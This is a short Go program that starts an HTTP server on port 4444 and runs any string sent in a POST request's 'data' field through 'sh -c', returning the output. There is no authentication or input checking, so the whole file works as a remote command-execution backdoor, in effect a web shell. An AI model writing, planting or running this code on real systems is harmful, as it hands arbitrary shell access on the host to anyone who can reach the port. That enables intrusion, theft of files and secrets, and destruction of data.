package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os/exec"
)

type Request struct {
	Command string `json:"data"`
}

func main() {
	http.HandleFunc("/api", handler)
	http.ListenAndServe(":4444", nil)
}

func handler(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "The method must be POST", http.StatusMethodNotAllowed)
		return
	}

	requestData := r.URL.Query().Get("data")

	if requestData == "" {
		var jsonData Request
		err := json.NewDecoder(r.Body).Decode(&jsonData)
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		fmt.Print(err)

		requestData = jsonData.Command
	}

	if requestData == "" {
		http.Error(w, "Empty command", http.StatusBadRequest)
		return
	}

	executeCommand(requestData, w)
}

func executeCommand(data string, w http.ResponseWriter) {
	fmt.Printf("\nReceived command: %+v\n", data)
	fmt.Printf("\nExecuting command: %+v\n", data)

	cmd := exec.Command("sh", "-c", data)
	output, err := cmd.Output()

	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	fmt.Printf("\nCommand executed!")

	w.WriteHeader(http.StatusOK)
	fmt.Fprintf(w, "%s", output)
}
